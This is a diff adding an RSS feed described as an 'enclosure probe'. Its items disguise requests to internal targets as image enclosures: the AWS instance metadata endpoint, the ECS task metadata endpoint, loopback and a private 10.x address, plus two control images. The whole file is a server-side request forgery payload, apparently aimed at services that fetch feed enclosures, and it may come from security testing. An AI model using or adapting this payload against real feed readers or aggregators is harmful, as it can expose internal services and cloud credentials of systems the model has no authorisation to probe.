@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title>ZKENCFEED</title>
+<link>https://bozellqp.github.io/</link><description>enclosure probe</description><item><title>ZKENC-CTLOWN</title><link>https://bozellqp.github.io/p-CTLOWN.html</link>
+<description>ZKENC-CTLOWN</description><guid>https://bozellqp.github.io/p-CTLOWN.html</guid>
+<enclosure url="https://bozellqp.github.io/img/clients/abbott.png" type="image/png"/><media:content url="https://bozellqp.github.io/img/clients/abbott.png" medium="image"/></item><item><title>ZKENC-CTLPUB</title><link>https://bozellqp.github.io/p-CTLPUB.html</link>
+<description>ZKENC-CTLPUB</description><guid>https://bozellqp.github.io/p-CTLPUB.html</guid>
+<enclosure url="https://nghttp2.org/httpbin/image/png" type="image/png"/><media:content url="https://nghttp2.org/httpbin/image/png" medium="image"/></item><item><title>ZKENC-IMDS</title><link>https://bozellqp.github.io/p-IMDS.html</link>
+<description>ZKENC-IMDS</description><guid>https://bozellqp.github.io/p-IMDS.html</guid>
+<enclosure url="http://169.254.169.254/latest/meta-data/" type="image/png"/><media:content url="http://169.254.169.254/latest/meta-data/" medium="image"/></item><item><title>ZKENC-LOOP</title><link>https://bozellqp.github.io/p-LOOP.html</link>
+<description>ZKENC-LOOP</description><guid>https://bozellqp.github.io/p-LOOP.html</guid>
+<enclosure url="http://127.0.0.1/" type="image/png"/><media:content url="http://127.0.0.1/" medium="image"/></item><item><title>ZKENC-ECS</title><link>https://bozellqp.github.io/p-ECS.html</link>
+<description>ZKENC-ECS</description><guid>https://bozellqp.github.io/p-ECS.html</guid>
+<enclosure url="http://169.254.170.2/v2/metadata" type="image/png"/><media:content url="http://169.254.170.2/v2/metadata" medium="image"/></item><item><title>ZKENC-PRIV</title><link>https://bozellqp.github.io/p-PRIV.html</link>
+<description>ZKENC-PRIV</description><guid>https://bozellqp.github.io/p-PRIV.html</guid>
+<enclosure url="http://10.0.0.1/x.png" type="image/png"/><media:content url="http://10.0.0.1/x.png" medium="image"/></item></channel></rss>
